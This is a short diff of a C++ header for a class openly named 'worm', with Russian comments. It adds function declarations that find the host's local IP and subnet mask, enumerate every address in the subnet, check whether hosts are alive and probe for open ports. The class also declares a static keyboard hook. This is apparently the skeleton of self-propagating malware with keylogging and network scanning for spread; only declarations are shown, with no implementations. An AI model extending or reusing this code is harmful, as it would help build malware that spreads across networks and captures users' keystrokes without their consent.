@@ -35,6 +35,12 @@ vector<wstring> get_all_volumes();
 vector<wstring> get_paths_for_volume(const wstring& volumeName);
 
 
+// обработка локальных сетей
+vector<wstring> get_local_ip_and_subnet(); // находим маску и внутренний айпишник хоста 
+vector<wstring> generate_ip_range(const string& ip, const string& mask); // по маске и айпи создаем вектор всех возможных хостов в нашей сети
+bool is_host_alive(const std::wstring& ip); // проверка айпишника на работоспособность
+bool is_port_open(const std::wstring& ip, int port, int timeout_ms = 200); // проверка айпишников на открытые порты
+
 class worm
 {
 private:
@@ -85,10 +91,7 @@ public:
 	static HHOOK keyboardHook;
 
 
-	// обработка локальных сетей
-	vector<wstring> get_local_ip_and_subnet();
-	vector<wstring> generate_ip_range(const string& ip, const string& mask);
-
+	
 
 };
 
